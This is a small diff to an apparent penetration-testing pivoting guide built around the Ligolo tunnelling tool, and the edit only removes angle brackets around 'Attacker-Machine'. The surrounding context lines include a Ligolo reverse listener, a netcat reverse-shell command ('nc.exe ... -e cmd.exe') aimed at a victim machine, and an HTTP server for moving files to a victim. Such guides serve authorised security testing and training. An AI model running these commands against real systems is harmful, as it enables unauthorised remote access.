@@ -72,7 +72,7 @@ On <session2> (Ligolo): listener_add --addr 0.0.0.0:<port-reverse> --to 127.0.0.
 nc.exe <IP-Victim2(PC2)> <port-reverse> -e cmd.exe 
 ````
 
-Imagine you want to transfer a file from the <Attacker-Machine> to Victim 4 (PC4).
+Imagine you want to transfer a file from the Attacker-Machine to Victim 4 (PC4).
 ````
 - Attacker Machine -
 $ python3 -m http.server <port-server>
